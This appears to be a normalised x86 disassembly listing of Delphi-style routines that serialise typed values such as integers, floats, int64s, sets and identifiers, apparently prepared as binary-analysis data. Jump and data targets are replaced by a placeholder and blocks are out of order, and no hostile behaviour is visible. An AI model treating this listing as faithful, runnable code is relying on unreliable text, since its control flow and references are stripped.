mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41f1bc
mov eax [ ebp - 0x4 ]
call sub_41f488
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f21b
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_40405c
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ea38
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41ea50
sub_41f238
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_420b04
mov edx esi
mov eax ebx
call sub_41ece4
pop esi
pop ebx
retn
sub_41f260
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420cfc
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41eaa4
pop ebx
pop ebp
retn 0xc
sub_41f284
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420cfc
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41eaa4
pop ebx
pop ebp
retn 0x4
sub_41f2a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420cfc
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41eaa4
pop ebx
pop ebp
retn 0x8
sub_41f2cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420cfc
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41eaa4
pop ebx
pop ebp
retn 0x8
sub_41f2f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_408048
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_408048
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420cfc
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_408048
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420cfc
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_408048
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420cfc
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420cfc
mov edx esi
mov eax ebx
call sub_420b14
mov dl 0xd
mov eax ebx
call sub_420cfc
jmp r-xdata
sub_41f3b4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41eaa4
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41eaa4
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41eaa4
jmp r-xdata
pop edx
pop ebx
retn
sub_41f428
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420cfc
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41eaa4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f3b4
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41f490
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41eaa4
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f3b4
sub_41f4d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034e8
call sub_414b1c
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f581
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034e8
mov edx [ ebp - 0x10 ]
call sub_414d20
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414d74
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420568
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f59c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4031f0
mov edx eax
mov eax [ edi ]
call sub_4034d4
test al al
jne r-xdata
mov al 0x1
sub_41f5cc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414da4
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414da4
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f624
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4152d4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d4
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f680
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4156f0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156f0
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f6d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f757
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415118
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4048bc
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415118
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4048bc
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f75e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40475c
retn
sub_41f768
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408048
test al al
jne r-xdata
mov al 0x1
sub_41f7a8
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414da4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f768
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f800
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414da4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push ebp
call sub_41f7a8
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f7a8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f880
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f92c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f933
lea eax [ ebp - 0x8 ]
call sub_405934
lea eax [ ebp - 0x4 ]
call sub_405934
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415754
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d500
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f768
pop ecx
mov ebx eax
sub_41f94c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41fa09
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415754
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d500
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa10
lea eax [ ebp - 0x10 ]
call sub_405934
lea eax [ ebp - 0xc ]
call sub_405934
lea eax [ ebp - 0x4 ]
call sub_405934
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415754
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f880
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41fa28
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415678
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415678
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_40357c
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41faa0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41fb27
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4155f8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4142a0
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4155f8
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414314
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb2e
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404aec
retn
sub_41fb38
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f59c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41fbfa ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414da4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push ebp
call sub_41f5cc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f624
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f6d8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f800
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fa28
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41faa0
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f680
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f94c
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414da4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41fca0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fce8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40429c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420ab0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcef
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41fcf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41fd7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414b1c
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420cfc
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414b28
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420b14
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd81
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41fd88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41fde8
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_4180c0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f3b4
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f2f0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdef
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41fdf4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41fe8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4040d0
xor eax eax
push ebp
push sub_41fe6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_404038
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41ebf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_40408c
retn
sub_41fe98
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41ff4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414da4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41fd88
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff53
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eba4
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414b28
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f2f0
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41fcf4
pop ecx
jmp r-xdata
jmp r-xdata
sub_41ff58
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f260
mov esp ebp
pop ebp
retn
sub_41ff98
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156f0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f428
pop ecx
pop ecx
pop ebp
retn
sub_41ffd4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_420029
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415118
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420c48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420030
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_42004c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42013b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40408c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420142
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404038
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404344
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_420034
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4043b8
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_42004c
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4043b8
jmp r-xdata
sub_420174
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420368
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414da4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420cfc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42036f
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40405c
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4040d0
xor eax eax
push ebp
push sub_4202e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40429c
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4043b8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f4d4
xor eax eax
pop edx
pop ecx
